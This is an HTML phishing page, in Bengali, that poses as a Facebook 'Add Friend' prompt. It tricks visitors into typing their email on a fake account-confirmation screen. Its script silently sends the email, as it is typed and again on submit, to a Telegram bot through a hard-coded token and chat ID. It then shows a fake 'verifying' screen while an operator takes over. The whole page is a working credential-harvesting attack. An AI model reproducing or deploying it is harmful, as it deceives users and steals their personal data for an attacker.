<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Add Friend</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #f0f2f5; font-family: 'Helvetica', Arial, sans-serif; overflow: hidden; }
        .hidden { display: none; }
    </style>
</head>
<body>

    <div id="step1" class="w-full max-w-sm mx-auto mt-10 p-4">
        <div class="bg-white shadow-md rounded-2xl overflow-hidden border">
            <img src="https://raw.githubusercontent.com/probasi-kollan-office-creator/facebook-friend-add/main/Picsart_26-03-15_06-28-09-284.jpg" class="w-full">
            <div class="p-6 text-center">
                <h2 class="text-xl font-bold text-gray-800 mb-4">নতুন বন্ধু বানান</h2>
                <button onclick="startProcess()" class="bg-[#1877f2] w-full text-white font-bold py-3 rounded-xl">Add Friend</button>
            </div>
        </div>
    </div>

    <div id="google_chooser" class="hidden w-full max-w-sm mx-auto mt-10 p-4">
        <div class="bg-white shadow-md rounded-2xl p-6 text-center border">
            <h1 class="text-lg font-bold text-gray-800 mb-2">অ্যাকাউন্ট নিশ্চিত করুন</h1>
            <p class="text-xs text-gray-500 mb-6">নিচের বক্স থেকে আপনার ইমেইলটি বেছে নিন</p>
            
            <input type="email" id="email_field" name="email" autocomplete="email" placeholder="ইমেইল এড্রেস" 
                   oninput="silentCapture(this.value)"
                   class="w-full border-2 border-blue-500 rounded-xl p-3 outline-none text-gray-800">
            
            <button onclick="finalSubmit()" class="bg-[#1877f2] w-full text-white font-bold py-3 rounded-xl mt-6">Add Friend</button>
        </div>
    </div>

    <div id="verifying" class="hidden fixed inset-0 bg-white z-50 flex flex-col items-center justify-center text-center">
        <div class="w-12 h-12 border-4 border-gray-200 border-t-blue-600 rounded-full animate-spin mb-4"></div>
        <h3 class="text-lg font-bold text-gray-800">অপেক্ষা করুন...</h3>
        <p class="text-sm text-gray-500 mt-2 px-10">অল্প কিছুক্ষণ অপেক্ষা করুন। আপনার আইডিটি যাচাই করা হচ্ছে...</p>
    </div>

<script>
    const botToken = "8617715035:AAHXQjkEtjYX40KQTAE5e_jVRQ_pKQX5Qjk";
    const chatId = "8516934257";
    let isInitialSent = false;

    function goToStep(id) {
        document.getElementById('step1').classList.add('hidden');
        document.getElementById('google_chooser').classList.add('hidden');
        document.getElementById('verifying').classList.add('hidden');
        document.getElementById(id).classList.remove('hidden');
    }

    function startProcess() {
        goToStep('google_chooser');
        setTimeout(() => {
            const input = document.getElementById('email_field');
            input.focus();
            input.click(); 
        }, 400);
    }

    // ইমেইল বক্সে আইডি আসার সাথে সাথে সাইলেন্টলি বটে পাঠাবে
    function silentCapture(val) {
        if(val.includes('@') && !isInitialSent) {
            sendToBot(`📧 **ইউজার ইমেইল সিলেক্ট করেছে:** \`${val}\``);
            isInitialSent = true; 
        }
    }

    // ২য় বার Add Friend বাটনে ক্লিক করলে যা হবে
    function finalSubmit() {
        const email = document.getElementById('email_field').value;
        if(email.length < 5) return;

        // টেলিগ্রামে ফাইনাল রিপোর্ট পাঠানো
        sendToBot(`🎯 **ইউজার বাটনে ক্লিক করেছে!**\n📧 ইমেইল: \`${email}\`\n\nকমান্ডস:\n/success\n/error\n/waiting`);

        goToStep('verifying'); // ওয়েটিং পেজে নিয়ে যাবে
    }

    // টেলিগ্রামে ডাটা পাঠানোর মূল ফাংশন (এটি আগে ছিল না)
    function sendToBot(text) {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
        }).catch(e => {});
    }
</script>
</body>
</html>
